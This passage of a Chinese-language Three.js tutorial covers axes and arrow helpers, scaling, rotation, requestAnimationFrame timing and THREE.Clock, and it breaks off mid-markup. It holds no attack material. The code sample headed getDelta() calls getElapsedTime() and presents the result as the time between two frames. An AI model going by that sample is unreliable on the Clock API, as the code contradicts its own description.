创建轨道控制器</span></span><br><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加坐标轴辅助器</span></span><br><span class="line"><span class="keyword">const</span> axesHelper = <span class="keyword">new</span> THREE.AxesHelper(<span class="number">5</span>);</span><br><span class="line">scene.add(axesHelper);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  cube.position.x += <span class="number">0.01</span>;</span><br><span class="line">  <span class="keyword">if</span> (cube.position.x &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    cube.position.x = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://i0.hdslb.com/bfs/article/a35394deeabd8745cb7306363341f4d7e71fe513.gif@489w_282h_progressive.webp" alt="img"></p><h2 id="六、Threejs添加坐标轴辅助器"><a href="#六、Threejs添加坐标轴辅助器" class="headerlink" title="六、Threejs添加坐标轴辅助器"></a>六、Threejs添加坐标轴辅助器</h2><h3 id="1-坐标轴辅助器"><a href="#1-坐标轴辅助器" class="headerlink" title="1. 坐标轴辅助器"></a>1. 坐标轴辅助器</h3><p>一般我们在开发阶段，添加物体和设置物体位置，都需要参考一下坐标轴，方便查看是否放置到对应位置。所以一般添加坐标轴辅助器来作为参考，辅助器简单模拟3个坐标轴的对象。红色代表 X 轴. 绿色代表 Y 轴. 蓝色代表 Z 轴。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axesHelper = <span class="keyword">new</span> THREE.AxesHelper( <span class="number">5</span> );</span><br><span class="line">scene.add( axesHelper );</span><br></pre></td></tr></table></figure><h3 id="2-ArrowHelper箭头辅助器"><a href="#2-ArrowHelper箭头辅助器" class="headerlink" title="2. ArrowHelper箭头辅助器"></a>2. ArrowHelper箭头辅助器</h3><p><strong>用于模拟方向的3维箭头对象</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dir = <span class="keyword">new</span> THREE.Vector3( <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//normalize the direction vector (convert to vector of length 1)</span></span><br><span class="line">dir.normalize();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> origin = <span class="keyword">new</span> THREE.Vector3( <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> );</span><br><span class="line"><span class="keyword">const</span> length = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> hex = <span class="number">0xffff00</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arrowHelper = <span class="keyword">new</span> THREE.ArrowHelper( dir, origin, length, hex );</span><br><span class="line">scene.add( arrowHelper )</span><br></pre></td></tr></table></figure><p><strong>构造函数</strong><br>ArrowHelper(dir : Vector3, origin : Vector3, length : Number, hex : Number, headLength : Number, headWidth : Number )</p><p><code>dir</code> – 基于箭头原点的方向. 必须为单位向量.<br><code>origin </code>– 箭头的原点.<br><code>length </code>– 箭头的长度. 默认为 1.<br><code>hex </code>– 定义的16进制颜色值. 默认为 0xffff00.<br><code>headLength </code>– 箭头头部(锥体)的长度. 默认为箭头长度的0.2倍(0.2 * length).<br><code>headWidth </code>– The width of the head of the arrow. Default is 0.2 * headLength. </p><h2 id="七、Threejs物体缩放与旋转"><a href="#七、Threejs物体缩放与旋转" class="headerlink" title="七、Threejs物体缩放与旋转"></a>七、Threejs物体缩放与旋转</h2><h3 id="1-scale设置缩放"><a href="#1-scale设置缩放" class="headerlink" title="1. scale设置缩放"></a>1. scale设置缩放</h3><p>因为物体的scale属性是vector3对象，因此按照vector的属性和方法，设置x/y/z轴方向的缩放大小。</p><p><img src="https://i0.hdslb.com/bfs/article/6787f2503d0cf27e1c4b9d672f5a5484131f8a4f.png@690w_171h_progressive.webp" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例如设置x轴放大3倍、y轴方向放大2倍、z轴方向不变</span></span><br><span class="line">cube.scale.set(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//单独设置某个轴的缩放</span></span><br><span class="line">cube.scale.x = <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-rotation设置旋转"><a href="#2-rotation设置旋转" class="headerlink" title="2.  rotation设置旋转"></a>2.  rotation设置旋转</h3><p>因为的旋转通过设置rotation属性，该属性是Euler类的实例，因此可以通过Euler类的方法进行设置旋转角度。</p><p><img src="https://i0.hdslb.com/bfs/article/ff0425e4f2395e403eaec39d9bc0b797e65df7a2.png@426w_128h_progressive.webp" alt="img"></p><p>因此可以通过以下方式设置旋转物体</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接设置旋转属性，例如围绕x轴旋转90度</span></span><br><span class="line">cube.rotation.x = -<span class="built_in">Math</span>.PI/<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//围绕x轴旋转45度</span></span><br><span class="line">cube.rotation.set(-<span class="built_in">Math</span>.PI / <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;XZY&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>set方法，每个参数具体定义:</strong></p><p>.set ( x : Float, y : Float, z : Float, order : String ) : this</p><p>x - 用弧度表示x轴旋转量。<br>y - 用弧度表示y轴旋转量。<br>z - 用弧度表示z轴旋转量。<br>order - (optional) 表示旋转顺序的字符串。</p><h4 id="2-1-旋转动画"><a href="#2-1-旋转动画" class="headerlink" title="2.1 旋转动画"></a>2.1 旋转动画</h4><p>每一帧旋转弧度制的0.01角度，实现动画代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  cube.position.x += <span class="number">0.01</span>;</span><br><span class="line">  cube.rotation.x += <span class="number">0.01</span>;</span><br><span class="line">  <span class="keyword">if</span> (cube.position.x &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    cube.position.x = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-综合上述代码"><a href="#3-综合上述代码" class="headerlink" title="3.综合上述代码"></a>3.综合上述代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">&quot;three&quot;</span>;</span><br><span class="line"><span class="comment">// 导入轨道控制器</span></span><br><span class="line"><span class="keyword">import</span> &#123; OrbitControls &#125; <span class="keyword">from</span> <span class="string">&quot;three/examples/jsm/controls/OrbitControls&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(THREE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标：控制3d物体移动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、创建场景</span></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改物体的位置</span></span><br><span class="line"><span class="comment">// cube.position.set(5, 0, 0);</span></span><br><span class="line">cube.position.x = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(cube);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// // 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line"><span class="comment">// renderer.render(scene, camera);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建轨道控制器</span></span><br><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加坐标轴辅助器</span></span><br><span class="line"><span class="keyword">const</span> axesHelper = <span class="keyword">new</span> THREE.AxesHelper(<span class="number">5</span>);</span><br><span class="line">scene.add(axesHelper);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  cube.position.x += <span class="number">0.01</span>;</span><br><span class="line">  <span class="keyword">if</span> (cube.position.x &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    cube.position.x = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://i0.hdslb.com/bfs/article/8d96d25daeaf34e6608bf5a6e695bb72e873ea46.gif@830w_543h_progressive.webp" alt="img"></p><h2 id="八、Threejs正确处理动画运动"><a href="#八、Threejs正确处理动画运动" class="headerlink" title="八、Threejs正确处理动画运动"></a>八、Threejs正确处理动画运动</h2><p>为了最好的利用性能和渲染效果，那么我们只需要在绘制每一帧画面的时候，计算需要渲染的画面即可。这个时候就可以使用window.requestAnimationFrame方法。</p><p><img src="https://i0.hdslb.com/bfs/article/30598fa39925444ccd5284764b35499960fd9699.gif@761w_543h_progressive.webp" alt="img"></p><h3 id="1-使用方式"><a href="#1-使用方式" class="headerlink" title="1. 使用方式"></a>1. 使用方式</h3><p><strong>window.requestAnimationFrame()</strong> 告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//下一帧渲染画面前，需要执行处理的函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.requestAnimationFrame(callback);</span><br></pre></td></tr></table></figure><h3 id="1-请求动画帧间隔不固定"><a href="#1-请求动画帧间隔不固定" class="headerlink" title="1. 请求动画帧间隔不固定"></a>1. 请求动画帧间隔不固定</h3><p>当你准备更新动画时你应该调用此方法。这将使浏览器在下一次重绘之前调用你传入给该方法的动画函数 (即你的回调函数)。回调函数执行次数通常是每秒 60 次，但在大多数遵循 W3C 建议的浏览器中，回调函数执行次数通常与浏览器屏幕刷新次数相匹配。因此具体回调函数执行的间隔时间跟屏幕刷新次数、当前页面运行时负荷等因素有关。</p><h4 id="1-2-1-解决确保不同帧率的画面运行速度一致"><a href="#1-2-1-解决确保不同帧率的画面运行速度一致" class="headerlink" title="1.2.1 解决确保不同帧率的画面运行速度一致"></a>1.2.1 解决确保不同帧率的画面运行速度一致</h4><p>回调函数会被传入<code>DOMHighResTimeStamp</code>参数，<code>DOMHighResTimeStamp</code>指示当前被 <code>requestAnimationFrame() </code>排序的回调函数被触发的时间。</p><p>请确保总是使用第一个参数 (或其它获得当前时间的方法) 计算每次调用之间的时间间隔，否则动画在高刷新率的屏幕中会运行得更快。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> preTime;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">time</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//第一次调用render函数，没有上一帧的时间</span></span><br><span class="line">  <span class="keyword">if</span> (preTime === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    preTime = time;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//计算每帧画面的间隔时间，单位毫秒</span></span><br><span class="line">  <span class="keyword">const</span> deltaTime = time - preTime;</span><br><span class="line">  <span class="built_in">console</span>.log(deltaTime)</span><br><span class="line">  <span class="comment">//保留当前时间作为上一帧时间，用于下一帧计算2帧间隔</span></span><br><span class="line">  preTime = time;</span><br><span class="line">  <span class="comment">//renderer.render(scene, camera);</span></span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><p>代码执行后，我们通过输出可以看出，每一帧间隔非常相近，但又不同。</p><p><img src="https://i0.hdslb.com/bfs/article/f02caef1668448e3e4f9ca0668897e1b77461ce6.png@306w_113h_progressive.webp" alt="img"></p><p>为了确保不同时间间隔，运动的速度一致，那么应该按照</p><p>移动距离 = 速度 * 时间</p><p>那么如果想要1m/s的速度远离原点的匀速运动，那么就按照这么编写代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> preTime;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">time</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//第一次调用render函数，没有上一帧的时间</span></span><br><span class="line">  <span class="keyword">if</span> (preTime === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    preTime = time;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//计算每帧画面的间隔时间，单位毫秒，当前时间减去上一帧的时间，即为2帧直接的间隔时间</span></span><br><span class="line">  <span class="keyword">const</span> deltaTime = time - preTime;</span><br><span class="line">  <span class="built_in">console</span>.log(deltaTime)</span><br><span class="line"></span><br><span class="line">  preTime = time;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//cube物体允许运动</span></span><br><span class="line">  <span class="comment">//elapsedTime/1000是将毫秒改为秒</span></span><br><span class="line">  <span class="comment">//1m/s的速度* 时间（秒）= 移动的距离</span></span><br><span class="line">  <span class="comment">//将当前位置+=移动的距离，即为最后的距离</span></span><br><span class="line">  cube.position.x += <span class="number">1</span> * (deltaTime/<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//renderer.render(scene, camera);</span></span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><h3 id="2-综合上述代码-3"><a href="#2-综合上述代码-3" class="headerlink" title="2 综合上述代码"></a>2 综合上述代码</h3><p><strong>在前面创建的项目中的main.js文件写入代码，实现每5秒，即从原点出发匀速在x轴进行1m/s的匀速运动</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import * as THREE from &quot;three&quot;;</span><br><span class="line">&#x2F;&#x2F; 导入轨道控制器</span><br><span class="line">import &#123; OrbitControls &#125; from &quot;three&#x2F;examples&#x2F;jsm&#x2F;controls&#x2F;OrbitControls&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; console.log(THREE);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 目标：requestAnimationFrame 时间参数 控制物体动画</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1、创建场景</span><br><span class="line">const scene &#x3D; new THREE.Scene();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 2、创建相机</span><br><span class="line">const camera &#x3D; new THREE.PerspectiveCamera(</span><br><span class="line">  75,</span><br><span class="line">  window.innerWidth &#x2F; window.innerHeight,</span><br><span class="line">  0.1,</span><br><span class="line">  1000</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置相机位置</span><br><span class="line">camera.position.set(0, 0, 10);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加物体</span><br><span class="line">&#x2F;&#x2F; 创建几何体</span><br><span class="line">const cubeGeometry &#x3D; new THREE.BoxGeometry(1, 1, 1);</span><br><span class="line">const cubeMaterial &#x3D; new THREE.MeshBasicMaterial(&#123; color: 0xffff00 &#125;);</span><br><span class="line">&#x2F;&#x2F; 根据几何体和材质创建物体</span><br><span class="line">const cube &#x3D; new THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 修改物体的位置</span><br><span class="line">&#x2F;&#x2F; cube.position.set(5, 0, 0);</span><br><span class="line">&#x2F;&#x2F; cube.position.x &#x3D; 3;</span><br><span class="line">&#x2F;&#x2F; 缩放</span><br><span class="line">&#x2F;&#x2F; cube.scale.set(3, 2, 1);</span><br><span class="line">&#x2F;&#x2F; cube.scale.x &#x3D; 5;</span><br><span class="line">&#x2F;&#x2F; 旋转</span><br><span class="line">cube.rotation.set(Math.PI &#x2F; 4, 0, 0, &quot;XZY&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将几何体添加到场景中</span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line">console.log(cube);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 初始化渲染器</span><br><span class="line">const renderer &#x3D; new THREE.WebGLRenderer();</span><br><span class="line">&#x2F;&#x2F; 设置渲染的尺寸大小</span><br><span class="line">renderer.setSize(window.innerWidth, window.innerHeight);</span><br><span class="line">&#x2F;&#x2F; console.log(renderer);</span><br><span class="line">&#x2F;&#x2F; 将webgl渲染的canvas内容添加到body</span><br><span class="line">document.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x2F;&#x2F; 使用渲染器，通过相机将场景渲染进来</span><br><span class="line">&#x2F;&#x2F; renderer.render(scene, camera);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建轨道控制器</span><br><span class="line">const controls &#x3D; new OrbitControls(camera, renderer.domElement);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加坐标轴辅助器</span><br><span class="line">const axesHelper &#x3D; new THREE.AxesHelper(5);</span><br><span class="line">scene.add(axesHelper);</span><br><span class="line"></span><br><span class="line">function render(time) &#123;</span><br><span class="line"></span><br><span class="line">  let t &#x3D; (time &#x2F; 1000) % 5;</span><br><span class="line">  cube.position.x &#x3D; t * 1;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  &#x2F;&#x2F;   渲染下一帧的时候就会调用render函数</span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://i0.hdslb.com/bfs/article/30598fa39925444ccd5284764b35499960fd9699.gif@761w_543h_progressive.webp" alt="img"></p><h2 id="九、Threejs中Clock跟踪时间处理动画"><a href="#九、Threejs中Clock跟踪时间处理动画" class="headerlink" title="九、Threejs中Clock跟踪时间处理动画"></a>九、Threejs中Clock跟踪时间处理动画</h2><h3 id="1-Clock"><a href="#1-Clock" class="headerlink" title="1. Clock"></a>1. Clock</h3><p>该对象用于跟踪时间。如果<code>performance.now</code>可用，则 <code>Clock </code>对象通过该方法实现，否则回落到使用略欠精准的<code>Date.now</code>来实现。</p><p>实例化<code>clock</code>对象，<code>new Clock( autoStart : Boolean )</code>，autoStart — (可选) 是否要在第一次调用 .<code>getDelta() </code>时自动开启时钟。默认值是 true。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化时钟</span></span><br><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock();</span><br></pre></td></tr></table></figure><h4 id="1-1-获取运行当前帧的时间"><a href="#1-1-获取运行当前帧的时间" class="headerlink" title="1.1 获取运行当前帧的时间"></a>1.1 获取运行当前帧的时间</h4><p><strong>getElapsedTime ()获取自时钟启动后的秒数。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置时钟</span></span><br><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获取时钟运行的总时长</span></span><br><span class="line">  <span class="keyword">let</span> time = clock.getElapsedTime();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;时钟运行总时长：&quot;</span>, time);</span><br><span class="line"></span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><p><strong>getDelta () 获取2帧之间的时间间隔。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置时钟</span></span><br><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获取2帧之间的时间间隔</span></span><br><span class="line">  <span class="keyword">let</span> deltaTime = clock.getElapsedTime();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;2帧之间的时间间隔：&quot;</span>, deltaTime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 